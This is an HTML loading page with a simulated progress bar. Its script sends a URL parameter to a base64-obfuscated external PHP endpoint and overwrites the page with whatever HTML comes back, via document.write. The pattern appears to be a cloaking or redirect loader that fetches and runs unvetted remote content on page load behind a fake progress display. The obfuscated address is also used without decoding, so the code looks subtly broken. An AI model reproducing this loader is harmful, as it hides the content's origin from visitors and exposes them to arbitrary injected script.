<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <title>loading...</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <style>
    body, html {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f9f9f9;
      margin: 0;
      overflow: hidden;
    }

    .loader {
      position: relative;
      width: 80px;
      height: 80px;
    }

    .loader svg {
      transform: rotate(-90deg);
    }

    .loader circle {
      fill: none;
      stroke-width: 8;
      cx: 40;
      cy: 40;
      r: 35;
    }

    .loader .track {
      stroke: #eee;
    }

    .loader .progress {
      stroke: #3498db;
      stroke-linecap: round;
      stroke-dasharray: 219.91; /* 2 * π * r, r=35 */
      stroke-dashoffset: 219.91;
      transition: stroke-dashoffset 0.3s ease;
    }

    .percent-text {
      position: absolute;
      width: 100%;
      text-align: center;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #3498db;
      font-weight: bold;
      font-family: 'Segoe UI', sans-serif;
    }
  </style>
</head>
<body>
  <div id="content">
    <div class="loader">
      <svg width="80" height="80">
        <circle class="track" r="35" cx="40" cy="40"></circle>
        <circle class="progress" r="35" cx="40" cy="40"></circle>
      </svg>
      <div class="percent-text" id="percent">0%</div>
    </div>
  </div>

  <script>
    // 获取 URL 参数
    function getQueryString(name) {
      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
      const r = window.location.search.substr(1).match(reg);
      return r ? unescape(r[2]) : null;
    }

    // 更新进度条
    function updateProgress(percent) {
      const circle = document.querySelector('.progress');
      const text = document.getElementById('percent');
      const radius = 35;
      const circumference = 2 * Math.PI * radius;
      const offset = circumference - (percent / 100) * circumference;
      circle.style.strokeDashoffset = offset;
      text.innerText = `${percent}%`;
    }

    // 模拟加载过程，替换为实际加载逻辑时，只需调用 updateProgress(x)
    let fakeProgress = 0;
    const timer = setInterval(() => {
      if (fakeProgress < 100) {
        fakeProgress += Math.floor(Math.random() * 5 + 1);
        if (fakeProgress > 100) fakeProgress = 100;
        updateProgress(fakeProgress);
      }
    }, 150);

    // 调用接口并替换页面内容
    window.onload = function() {
      const url = getQueryString("u");

      // 使用原生 JavaScript 发起 POST 请求
      const xhr = new XMLHttpRequest();
      xhr.open("POST", "aHR0cHM6Ly9maC53a2t4LmNuL0Nvcy9hcGkucGhw", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
          const data = JSON.parse(xhr.responseText);
          updateProgress(100); // 保证进度到100%
          setTimeout(() => {
            clearInterval(timer);
            document.write(data.html);
          }, 300);
        }
      };
      xhr.send(`url=${encodeURIComponent(url)}`);
    };
  </script>
</body>
</html>
